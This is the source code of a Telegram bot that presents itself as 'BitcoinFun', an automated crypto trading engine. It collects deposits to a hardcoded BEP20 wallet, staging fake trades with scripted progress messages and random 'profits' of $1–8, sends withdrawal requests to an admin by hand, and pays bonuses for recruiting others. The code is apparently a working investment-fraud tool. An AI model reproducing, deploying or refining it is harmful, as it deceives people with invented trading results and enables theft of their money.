require("dotenv").config();
const { Telegraf, Markup, session } = require("telegraf");
const express = require("express");
const admin = require("firebase-admin");

const app = express();
const bot = new Telegraf(process.env.TELEGRAM_BOT_TOKEN);
const ADMIN_ID = String(process.env.ADMIN_ID);
const BEP20_ADDRESS = "0x2784B4515D98C2a3Dbf59ebAAd741E708B6024ba";

// ---------------- FIREBASE ----------------
const serviceAccount = JSON.parse(process.env.FIREBASE_SERVICE_ACCOUNT);
admin.initializeApp({
  credential: admin.credential.cert(serviceAccount),
});
const db = admin.firestore();

// ---------------- MIDDLEWARE ----------------
bot.use(session());

// ---------------- HELPERS ----------------
const userRef = (id) => db.collection("users").doc(String(id));

// ---------------- START ----------------
bot.start(async (ctx) => {
  const uid = String(ctx.from.id);
  const refId = ctx.startPayload;

  const ref = userRef(uid);
  const snap = await ref.get();

  if (!snap.exists) {
    await ref.set({
      balance: 0,
      deposited: 0,
      referrals: 0,
      lastTrade: 0,
    });

    // referral bonus
    if (refId && refId !== uid) {
      const rRef = userRef(refId);
      const rSnap = await rRef.get();
      if (rSnap.exists) {
        await rRef.update({
          balance: admin.firestore.FieldValue.increment(10),
          referrals: admin.firestore.FieldValue.increment(1),
        });
        bot.telegram.sendMessage(refId, "🎉 You earned *$10* referral bonus!", {
          parse_mode: "Markdown",
        });
      }
    }
  }

  return ctx.reply(
    "🚀 *BitcoinFun™ Smart Liquidity Engine*\n\n" +
      "⚡ Institutional-grade liquidity execution\n" +
      "🌊 Deep pool routing & smart allocation\n" +
      "🤖 Automated probability engine (LIVE)\n\n" +
      "💰 *Minimum Capital:* `$35`\n" +
      "📈 Trade smart • Earn fast • Withdraw anytime\n\n" +
      "🔒 Secure • ⏱ Fast • 💎 Exclusive\n\n" +
      "_Tap a button below to enter the system_ 👇",
    {
      parse_mode: "Markdown",
      ...Markup.inlineKeyboard([
        [Markup.button.callback("➕ ADD CAPITAL ($35+)", "deposit")],
        [Markup.button.callback("📈 SMART TRADE (UP / DOWN)", "trade")],
        [Markup.button.callback("💳 WITHDRAW PROFITS", "withdraw")],
        [Markup.button.callback("🆘 LIVE SUPPORT", "support")],
        [Markup.button.callback("🤝 REFER & EARN $10", "refer")],
      ]),
    }
  );
});

// ---------------- DEPOSIT ----------------
bot.action("deposit", async (ctx) => {
  ctx.session.mode = "deposit_amount";
  return ctx.reply(
    "💎 *Capital Injection Panel*\n\n" +
      "Send funds to the address below:\n\n" +
      `\`${BEP20_ADDRESS}\`\n\n` +
      "💰 Minimum: *$35*\n\n" +
      "_Enter amount to continue_",
    { parse_mode: "Markdown" }
  );
});

// ---------------- TRADE ----------------
bot.action("trade", async (ctx) => {
  return ctx.reply(
    "📊 *Smart Trade Panel*\n\nChoose market direction:",
    {
      parse_mode: "Markdown",
      ...Markup.inlineKeyboard([
        [
          Markup.button.callback("🟢 UP (BULLISH)", "trade_up"),
          Markup.button.callback("🔴 DOWN (BEARISH)", "trade_down"),
        ],
      ]),
    }
  );
});

bot.action(["trade_up", "trade_down"], async (ctx) => {
  const uid = String(ctx.from.id);
  const ref = userRef(uid);
  const user = (await ref.get()).data();

  const now = Date.now();
  if (now - user.lastTrade < 12 * 60 * 60 * 1000) {
    return ctx.reply("⏳ Cooldown active. Come back after 12 hours.");
  }

  await ref.update({ lastTrade: now });

  await ctx.reply("⚙️ Initializing smart contract…");
  setTimeout(async () => {
    await ctx.reply("🌊 Liquidity pools connected…");
  }, 10000);

  setTimeout(async () => {
    await ctx.reply("🧠 Probability engine calculating outcome…");
  }, 20000);

  setTimeout(async () => {
    const win = Math.floor(Math.random() * 8) + 1;
    await ref.update({
      balance: admin.firestore.FieldValue.increment(win),
    });
    ctx.reply(
      `✅ *TRADE EXECUTED*\n\n💸 Profit Added: *$${win}*\n\n🔁 Next cycle after 12 hours`,
      { parse_mode: "Markdown" }
    );
  }, 30000);
});

// ---------------- WITHDRAW ----------------
bot.action("withdraw", async (ctx) => {
  ctx.session.mode = "withdraw_amount";
  return ctx.reply(
    "💳 *Withdrawal Panel*\n\n" +
      "✔ Amount ≤ Deposited\n" +
      "✔ Network: BEP20 (BSC)\n\n" +
      "_Enter withdrawal amount_",
    { parse_mode: "Markdown" }
  );
});

// ---------------- SUPPORT ----------------
bot.action("support", async (ctx) => {
  ctx.session.mode = "support";
  return ctx.reply(
    "🆘 *Live Support*\n\n" +
      "Type your issue below.\n" +
      "_Admin will personally review it._",
    { parse_mode: "Markdown" }
  );
});

// ---------------- REFERRAL ----------------
bot.action("refer", async (ctx) => {
  const me = await bot.telegram.getMe();
  const link = `https://t.me/${me.username}?start=${ctx.from.id}`;
  return ctx.reply(
    "🤝 *Referral Program*\n\n" +
      "Invite friends & earn *$10* per referral.\n\n" +
      `🔗 ${link}`,
    { parse_mode: "Markdown" }
  );
});

// ---------------- TEXT HANDLER ----------------
bot.on("text", async (ctx) => {
  const mode = ctx.session.mode;
  const uid = String(ctx.from.id);
  const ref = userRef(uid);
  const user = (await ref.get()).data();

  // SUPPORT
  if (mode === "support") {
    await bot.telegram.sendMessage(
      ADMIN_ID,
      `🆘 SUPPORT\nUser: ${uid}\nMessage: ${ctx.message.text}`
    );
    ctx.session.mode = null;
    return ctx.reply("✅ Support message sent to Admin.");
  }

  // DEPOSIT AMOUNT
  if (mode === "deposit_amount") {
    const amt = Number(ctx.message.text);
    if (isNaN(amt) || amt < 35) {
      return ctx.reply("❌ Invalid amount. Minimum is $35.");
    }
    ctx.session.depositAmt = amt;
    ctx.session.mode = "deposit_proof";
    return ctx.reply("📸 Upload payment screenshot.");
  }

  // WITHDRAW AMOUNT
  if (mode === "withdraw_amount") {
    const amt = Number(ctx.message.text);
    if (isNaN(amt) || amt > user.deposited) {
      return ctx.reply("❌ Invalid withdrawal amount.");
    }
    ctx.session.withdrawAmt = amt;
    ctx.session.mode = "withdraw_address";
    return ctx.reply("📥 Send your BEP20 wallet address:");
  }

  // WITHDRAW ADDRESS
  if (mode === "withdraw_address") {
    await bot.telegram.sendMessage(
      ADMIN_ID,
      `💳 WITHDRAW REQUEST\nUser: ${uid}\nAmount: $${ctx.session.withdrawAmt}\nAddress: ${ctx.message.text}`
    );
    ctx.session.mode = null;
    return ctx.reply("⏳ Withdrawal request sent to Admin.");
  }
});

// ---------------- DEPOSIT PROOF ----------------
bot.on(["photo", "document"], async (ctx) => {
  if (ctx.session.mode !== "deposit_proof") return;

  const fileId = ctx.message.photo
    ? ctx.message.photo.at(-1).file_id
    : ctx.message.document.file_id;

  await bot.telegram.sendPhoto(ADMIN_ID, fileId, {
    caption: `💰 DEPOSIT PROOF\nUser: ${ctx.from.id}\nAmount: $${ctx.session.depositAmt}`,
  });

  ctx.session.mode = null;
  return ctx.reply("⏳ Deposit proof sent to Admin for verification.");
});

// ---------------- SERVER ----------------
app.get("/", (_, res) => res.send("BitcoinFun Bot LIVE"));
app.listen(process.env.PORT || 3000);

// ---------------- LAUNCH ----------------
bot.launch();
console.log("🚀 BitcoinFun Smart Liquidity Bot LIVE");